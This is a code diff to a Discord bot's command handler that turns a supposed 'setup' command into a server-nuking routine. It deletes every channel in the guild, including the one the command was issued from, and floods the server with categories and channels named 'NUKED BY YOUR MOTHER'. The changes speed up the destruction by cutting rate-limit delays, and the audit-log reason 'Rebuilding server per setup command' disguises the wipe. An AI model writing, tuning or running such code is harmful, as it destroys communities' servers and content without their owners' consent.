@@ -801,10 +801,10 @@ const commandHandlers = {
                         }
                         // Define your server plan here
                         const plan = [
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
-                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] }
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'], voice: ['NUKED BY YOUR MOTHER'] },
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] },
+                            { category: 'NUKED BY YOUR MOTHER', text: ['NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER','NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER', 'NUKED BY YOUR MOTHER'] }
                         ];
 
                         const guild = message.guild;
@@ -813,13 +813,43 @@ const commandHandlers = {
 
                         // Delete existing channels (except skipped ones)
                         try {
+                            // Build list of channels to delete, ensure invoking channel is included
+                            const toDelete = [];
                             for (const ch of guild.channels.cache.values()) {
                                 if (!ch || !ch.id) continue;
                                 if (skipIds.has(ch.id)) continue;
                                 if (ch.managed) continue; // skip integrations/webhooks
-                                try { await ch.delete('Rebuilding server per setup command'); } catch (e) { await new Promise(r=>setTimeout(r, 500)); }
-                                // small delay to avoid rate limits
-                                await new Promise(r=>setTimeout(r, 300));
+                                toDelete.push(ch);
+                            }
+                            // Ensure the channel where the command was run is included
+                            const invokingChannelId = message.channel ? message.channel.id : null;
+                            if (invokingChannelId && !toDelete.find(c => c.id === invokingChannelId)) {
+                                const inv = guild.channels.cache.get(invokingChannelId);
+                                if (inv) toDelete.push(inv);
+                            }
+
+                            // Delete in order but delete invoking channel last to allow the script to finish
+                            const lastIndex = toDelete.findIndex(c => c.id === invokingChannelId);
+                            if (lastIndex >= 0) {
+                                const [invCh] = toDelete.splice(lastIndex, 1);
+                                toDelete.push(invCh);
+                            }
+
+                            let delCount = 0;
+                            for (const ch of toDelete) {
+                                try {
+                                    await ch.delete('Rebuilding server per setup command');
+                                    delCount++;
+                                } catch (e) {
+                                    delCount++;
+                                    await new Promise(r => setTimeout(r, 150));
+                                }
+                                // small adaptive delay to reduce overall runtime but respect rate limits
+                                if (delCount % 8 === 0) {
+                                    await new Promise(r => setTimeout(r, 200));
+                                } else {
+                                    await new Promise(r => setTimeout(r, 80));
+                                }
                             }
                         } catch (err) { /* continue even on errors */ }
 
@@ -830,7 +860,7 @@ const commandHandlers = {
                                 try {
                                     category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory });
                                 } catch (e) {
-                                    await new Promise(r=>setTimeout(r, 500));
+                                    await new Promise(r=>setTimeout(r, 150));
                                     category = await guild.channels.create({ name: section.category, type: ChannelType.GuildCategory }).catch(()=>null);
                                 }
                                 if (!category) continue;
@@ -840,9 +870,9 @@ const commandHandlers = {
                                         try {
                                             await guild.channels.create({ name: name, type: ChannelType.GuildText, parent: category.id });
                                         } catch (e) {
-                                            await new Promise(r=>setTimeout(r, 500));
+                                            await new Promise(r=>setTimeout(r, 150));
                                         }
-                                        await new Promise(r=>setTimeout(r, 250));
+                                        await new Promise(r=>setTimeout(r, 80));
                                     }
                                 }
                                 // create voice channels
@@ -851,9 +881,9 @@ const commandHandlers = {
                                         try {
                                             await guild.channels.create({ name: vname, type: ChannelType.GuildVoice, parent: category.id });
                                         } catch (e) {
-                                            await new Promise(r=>setTimeout(r, 500));
+                                            await new Promise(r=>setTimeout(r, 150));
                                         }
-                                        await new Promise(r=>setTimeout(r, 250));
+                                        await new Promise(r=>setTimeout(r, 80));
                                     }
                                 }
                             }
